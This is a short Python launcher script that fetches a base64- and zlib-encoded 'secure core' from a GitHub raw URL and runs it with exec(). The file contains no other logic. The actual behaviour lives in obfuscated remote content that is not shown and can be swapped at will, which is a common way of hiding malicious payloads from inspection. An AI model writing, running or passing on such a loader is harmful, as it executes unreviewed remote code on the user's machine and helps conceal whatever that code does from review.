# -*- coding: utf-8 -*-
import os
import sys
import time
import urllib.request
import base64
import zlib
import requests

# GitHub Raw URL for secure core text file
RAW_URL = "https://raw.githubusercontent.com/rajavau379-pixel/Kamal-Raja/refs/heads/main/secure_core.txt"

def load_core():
    try:
        # Fetching the encrypted core with cache buster
        url = RAW_URL + "?v=" + str(time.time())
        res = requests.get(url, timeout=15)
        if res.status_code == 200:
            encrypted_data = res.text.strip()
            # Decode base64 and decompress zlib
            compressed_data = base64.b64decode(encrypted_data.encode('utf-8'))
            original_code = zlib.decompress(compressed_data).decode('utf-8')
            
            # Execute the core code dynamically
            exec(original_code, globals())
        else:
            print("[!] Failed to fetch secure core from server!")
            sys.exit()
    except Exception as e:
        print(f"[!] Connection or Execution Error: {e}")
        sys.exit()

if __name__ == "__main__":
    load_core()
